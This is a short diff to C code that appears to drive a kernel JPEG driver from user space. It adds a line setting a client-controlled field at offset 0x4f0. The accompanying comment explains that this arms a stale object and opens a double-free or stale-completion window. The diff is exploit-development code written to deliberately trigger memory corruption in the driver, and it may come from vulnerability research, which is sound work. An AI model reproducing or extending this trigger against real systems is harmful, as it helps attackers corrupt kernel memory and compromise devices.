@@ -105,6 +105,12 @@ static void j_pack(uint8_t *big, uint32_t src, uint32_t dst, uint32_t w, uint32_
     *(uint32_t *)(big + A14_23F77_JPEG_DEST_ID_OFF) = dst;
     *(uint32_t *)(big + 0x428) = w;
     *(uint32_t *)(big + 0x42c) = h;
+    /* murk second-defect fire (24B156 decode 2026-11-18): +0x4f0 gate arms the
+       +0x488 object (created-once at 0x9052228/0x9052240, released once and
+       never cleared at teardown 0x9051a38) = the latent double-free/stale-
+       completion window. The gate is client-settable (startEncoderExt 0x9051b90
+       / startEncoder2024 0x901ad14 write +0x4f0). */
+    *(uint32_t *)(big + 0x4f0) = 1;
 }
 
 static kern_return_t j_fire(JFire *f, int async, uint32_t sel, const char *tag) {
